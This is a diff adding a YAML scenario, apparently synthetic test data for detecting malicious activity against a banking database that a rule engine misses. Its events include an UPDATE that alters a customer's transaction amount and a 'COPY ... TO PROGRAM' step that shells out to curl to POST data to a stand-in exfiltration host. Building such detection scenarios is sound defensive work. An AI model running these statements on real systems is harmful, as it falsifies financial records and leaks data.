@@ -1,0 +1,23 @@
+scenario_id: gen_banking_47_data_tamper_mal_1223
+family_id: gen_banking_47_data_tamper_mal_fam1223
+domain: banking
+time_of_day: 02:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.5
+  events:
+  - step_id: act
+    sql: UPDATE transactions SET amount = 252541 WHERE customer_id = 20679
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.43.32
+      port: 443
